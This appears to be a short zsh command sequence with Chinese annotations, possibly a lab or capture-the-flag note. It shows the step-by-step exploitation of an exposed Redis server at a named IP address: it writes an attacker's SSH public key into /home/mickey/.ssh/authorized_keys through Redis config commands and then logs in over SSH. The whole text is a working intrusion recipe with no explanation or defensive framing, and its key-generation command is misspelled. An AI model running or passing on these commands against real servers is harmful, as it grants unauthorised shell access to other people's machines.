```zsh
ssh-genkey 创建id-rsa.pub

redis-cli -h 121.201.8.217 -p 7963

config set dir /home/mickey/.ssh/

config set dbfilename authorized_keys

set shit "\n\n\nXXXX\n\n\n"，其中XXXX为上面生成id-rsa.pub的内容

save

quit

ssh mickey@121.201.8.217
```